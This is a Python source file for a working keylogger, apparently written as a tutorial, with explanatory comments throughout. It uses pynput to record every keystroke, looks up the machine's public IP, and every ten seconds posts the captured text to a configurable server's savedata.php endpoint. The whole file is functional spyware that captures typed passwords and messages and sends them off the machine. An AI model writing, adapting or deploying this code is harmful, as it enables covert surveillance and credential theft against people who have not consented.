from pynput import keyboard  # Import the keyboard from pynput
import requests  # We need to import the requests library to Post the data to the server.
from threading import Timer
from datetime import datetime
ip_address = '127.0.0.1'
port_number = "80"

time_interval = 10  # Time interval in seconds for code to execute.

public_ip = requests.get('http://ipecho.net/plain').text
identifier = f"{public_ip}: {datetime.now()}\n"
text = ''


def start_timer():
    timer = Timer(time_interval, send_post_req)
    # We start the timer thread.
    timer.start()


def send_post_req():
    global text
    if text == '':
        start_timer()
    else:
        try:
            requests.post(f"http://{ip_address}:{port_number}/savedata.php", data={'keys': f'{identifier}{text}\n'})
            # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive
            # function, and will call itself as long as the program is running.
            start_timer()
            text = ''  # reset text value

        except Exception as error:
            print("Couldn't complete request!", error)

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.


def key_handler(key):
    global text

    # Based on the key press we handle the way the key gets logged to the in memory string.
    # Read more on the different keys that can be logged here:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.


with keyboard.Listener(on_press=key_handler) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
